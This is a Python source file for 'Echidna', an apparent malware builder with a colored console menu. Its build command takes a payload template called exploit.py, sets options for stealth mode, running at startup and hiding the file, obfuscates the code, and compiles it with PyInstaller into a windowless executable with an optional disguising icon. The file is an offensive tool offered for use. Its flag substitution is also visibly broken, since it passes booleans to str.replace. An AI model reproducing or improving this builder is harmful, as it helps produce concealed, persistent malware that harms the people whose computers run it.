import os
import shutil
import random
import colorama
import pyfiglet
import sys
from termcolor import colored


from json import load
from urllib.request import urlopen
from colorama import Fore, Style, init

BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'poison', 'doom', 'avatar'
colorama.init(autoreset=True)

def logo() -> None:
    os.system(CLEAR)
    font = 'poison'
    color1 = RED
    color2 = RED
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format(
        'Kronos\nEchidna',
        font=font,
        justify='center',
        width=os.get_terminal_size().columns),
        end=''
        )
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)

def cleanup(file):
    os.remove(file + "_obf.py")
    os.remove(file + "_obf.spec")
    shutil.rmtree('build')

def generate():
    Uinput = input('$ EXE name => ')

    filename = Uinput

    Uinput = input('$ ICON.ico name (leave empty for no icon)=> ')

    if Uinput != "":
        icon = Uinput + ".ico"
    else:
        icon = "NONE"

    Uinput = input('$ Stealth Mode (y/n) => ')
    stealthMode = Uinput

    Uinput = input('$ Run on StartUp (y/n) => ')
    startUp = Uinput

    Uinput = input('$ Hide file (y/n) => ')
    hide = Uinput

    if stealthMode.lower() == 'y' or stealthMode.lower() == 'yes':
        stealthMode = True

    if startUp.lower() == 'y' or startUp.lower() == 'yes':
        startUp = True

    if hide.lower() == 'y' or hide.lower() == 'yes':
        hide = True

    with open('./exploit.py', 'r', encoding="utf-8") as f:
        code = f.read()

    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(code.replace('%STEALTH_MODE_HERE%', stealthMode)
            .replace("%STARTUP_HERE%", startUp)
            .replace("%HIDE_HERE%", hide))

    os.system(f"py obfuscator.py {filename}.py")

    os.system(f'py -m PyInstaller --clean --windowed --hidden-import json --noconsole -F -i {icon} --distpath ./ .\\{filename}_obf.py')
    cleanup(filename)
    os.rename(f'{filename}_obf.exe',f'{filename}.exe')
    os.system('cls')
    logo()

    print(f'[+] Successfully generated {filename}.exe')
    command()


def command():
    Uinput = input("[" + colored("$", "red") + '] Echidna => ')
    if Uinput == "help":
        print(colored("help", "green"), " | Shows this menu")
        print("--------------------------------------------------------")
        print(colored("build", "green"), "| Build new EXEcuteable file")
        print("--------------------------------------------------------")
        print(colored("clear", "green"), "| Clear console")
        print("--------------------------------------------------------")
        print(colored("exit", "green"), " | Exits console")
        command()
    elif Uinput == "clear" or Uinput == "cls":
        main()
    elif Uinput == "build":
        generate()
    elif Uinput == "exit":
        sys.exit()
    else:
        print("[" + colored("+", "red") + "] Command not found")
        command()

def main():
    os.system('cls')
    logo()
    print("[+] Echidna By Kronos")
    print("[+] use command", colored('help', 'green'), "for help")
    command()


main()